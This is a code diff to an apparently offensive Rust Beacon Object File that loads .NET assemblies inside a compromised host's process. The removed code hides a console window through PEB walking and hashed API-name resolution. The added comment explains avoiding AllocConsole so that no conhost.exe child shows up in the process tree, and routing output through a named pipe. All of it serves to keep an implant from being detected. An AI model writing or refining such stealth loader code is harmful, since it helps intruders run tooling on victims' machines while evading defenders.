@@ -31,98 +31,19 @@ fn main(args: *mut u8, len: usize) {
     }
 }
 
-/// If the host process has no console attached, AllocConsole creates one and
-/// ShowWindow(SW_HIDE) hides it immediately. Prevents a visible CMD popup
-/// when the loaded assembly first uses `Console.WriteLine` (the .NET runtime
-/// would otherwise auto-allocate a visible console).
-#[cfg(target_os = "windows")]
-unsafe fn ensure_hidden_console() {
-    unsafe {
-        let kbase = match opsec_peb::resolve_module(opsec_strcrypt::hash!("kernelbase.dll")) {
-            Some(m) => m,
-            None => return,
-        };
-        let get_console_window = match opsec_peb::resolve_export(
-            kbase,
-            opsec_strcrypt::hash!("GetConsoleWindow"),
-        ) {
-            Some(f) => f,
-            None => return,
-        };
-        let alloc_console = match opsec_peb::resolve_export(
-            kbase,
-            opsec_strcrypt::hash!("AllocConsole"),
-        ) {
-            Some(f) => f,
-            None => return,
-        };
-        type GetWinFn = unsafe extern "system" fn() -> *mut core::ffi::c_void;
-        type AllocFn = unsafe extern "system" fn() -> i32;
-        let get_win: GetWinFn = core::mem::transmute(get_console_window);
-        let alloc: AllocFn = core::mem::transmute(alloc_console);
-
-        if !get_win().is_null() {
-            // Console already attached — nothing to do.
-            return;
-        }
-        if alloc() == 0 {
-            return;
-        }
-        // Hide the freshly-allocated console.
-        let user32_w: [u16; 11] = [0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0];
-        if !crate::clr_netfx_console_loadlib(&user32_w) {
-            return;
-        }
-        let user32 = match opsec_peb::resolve_module(opsec_strcrypt::hash!("user32.dll")) {
-            Some(m) => m,
-            None => return,
-        };
-        let show_window = match opsec_peb::resolve_export(
-            user32,
-            opsec_strcrypt::hash!("ShowWindow"),
-        ) {
-            Some(f) => f,
-            None => return,
-        };
-        type ShowFn = unsafe extern "system" fn(*mut core::ffi::c_void, i32) -> i32;
-        let show: ShowFn = core::mem::transmute(show_window);
-        const SW_HIDE: i32 = 0;
-        let wnd = get_win();
-        if !wnd.is_null() {
-            let _ = show(wnd, SW_HIDE);
-        }
-    }
-}
-
-/// LoadLibrary user32 via kernelbase. Returns true if loaded.
-#[cfg(target_os = "windows")]
-unsafe fn clr_netfx_console_loadlib(name_w: &[u16]) -> bool {
-    unsafe {
-        if opsec_peb::resolve_module(opsec_strcrypt::hash!("user32.dll")).is_some() {
-            return true;
-        }
-        let kbase = match opsec_peb::resolve_module(opsec_strcrypt::hash!("kernelbase.dll")) {
-            Some(m) => m,
-            None => return false,
-        };
-        let ll = match opsec_peb::resolve_export(kbase, opsec_strcrypt::hash!("LoadLibraryW")) {
-            Some(f) => f,
-            None => return false,
-        };
-        type LL = unsafe extern "system" fn(*const u16) -> *mut core::ffi::c_void;
-        let f: LL = core::mem::transmute(ll);
-        !f(name_w.as_ptr()).is_null()
-    }
-}
-
 #[cfg(target_os = "windows")]
 fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
     use error::BofError;
     let a = args::parse(raw_args, len).map_err(BofError::Args)?;
     unsafe {
-        // Allocate + hide a console so the .NET runtime doesn't pop up a
-        // visible CMD window when the loaded assembly uses Console.WriteLine.
-        ensure_hidden_console();
+        // NOTE: We do NOT call AllocConsole here. On Win10+ AllocConsole
+        // spawns `conhost.exe` as a child process, which is visible in
+        // the process tree and may trigger child-process injection if
+        // the operator has spawnto persistence configured. Instead, we
+        // rely on `io::IoChannel` to SetStdHandle to a named pipe before
+        // CLR initialization — Console.WriteLine writes to that handle
+        // without ever needing a console window object.
+        //
         // Multi-file mode (a.mode == 1) skips PE parsing — the input is a
         // bundle, not a single assembly. Caller is responsible for binary
         // compatibility. Single-file mode parses normally.
